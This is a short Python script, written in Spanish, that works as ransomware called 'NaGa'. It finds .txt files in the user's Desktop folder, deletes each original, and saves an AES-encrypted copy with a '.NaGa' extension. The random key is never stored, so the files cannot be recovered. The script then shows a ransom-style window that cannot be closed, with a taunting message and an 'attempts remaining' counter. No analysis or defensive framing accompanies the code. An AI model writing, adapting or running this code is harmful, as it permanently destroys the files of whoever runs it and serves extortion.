import os
import glob
import pyaes
from pathlib import Path
import tkinter as tk
from tkinter import ttk

EXTENSION = ".NaGa"

extensiones = ["*.txt"]
char = "."


#Rutas las cuales atacara
def rutas():
    path = Path.home() / "Escritorio"
    return path


#Cambi de directorio a la de las funciones de arriba
def cambiarRuta():
    try:
        ruta = rutas()
        return ruta
    except Exception:
        pass

directorios = os.listdir(rutas())

for dires in directorios:
    os.chdir(cambiarRuta())

print(directorios)


def encriptar():
    for archivos in extensiones:
        for archivoFor in glob.glob(archivos):
            print(archivoFor)
            f = open(f'{cambiarRuta()}/{archivoFor}', 'rb')
            datosAr = f.read()
            f.close()

            os.remove(f'{cambiarRuta()}/{archivoFor}')
            key = os.urandom(16)
            aes = pyaes.AESModeOfOperationCTR(key)
            datosEncriptados = aes.encrypt(datosAr)

            nuevoAr = archivoFor.replace(char, "") + EXTENSION
            nuevoAr = open(f'{nuevoAr}', 'wb')
            nuevoAr.write(datosEncriptados)
            nuevoAr.close()


if __name__ == "__main__":
    encriptar()

    window = tk.Tk()
    window.title("NaGa")

    label = tk.Label(window, text="[Tus archivos han sido encriptados por NaGa]\n\n 'Las almas de los muertos tienen que ser conducidas a ser juzgadas' \n\nIntentos restantes: 17",
                    bg='black', bd=100, fg="cyan", font="Terminal")

    label.pack()
    window.resizable(False, False)
    def cerraVen():
        window.destroy()
    def desactivar():
        pass
    window.protocol("WM_DELETE_WINDOW", desactivar)
    window.mainloop()
